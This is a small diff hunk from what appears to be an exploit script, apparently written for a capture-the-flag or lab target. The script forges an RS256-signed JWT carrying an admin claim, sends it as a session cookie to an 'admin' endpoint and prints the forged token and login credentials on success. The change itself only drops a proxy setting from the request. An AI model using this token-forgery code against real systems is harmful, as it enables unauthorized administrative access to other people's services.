@@ -80,7 +80,7 @@ if x == 'y':
 	encoded = jwt.encode({"username": "AbuQasem","email": "AbuQasem@Muslim.com","admin_cap": 1}, private_key, algorithm="RS256", headers=header)
 	cookie= {'auth': f'{encoded}; uuid=5da16b5f-fcde-4f1b-82ec-a9032ba0a942'}
 	header_get = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
-	req2=requests.get(url+'admin',cookies=cookie,headers=header_get,proxies=proxy)
+	req2=requests.get(url+'admin',cookies=cookie,headers=header_get)
 	if req2.status_code == 200 :
 		print ("Login with those creds: Username= AbuQasem    Pass: 1337\n")
 		print("\n\n[+]Here is your token :",encoded)
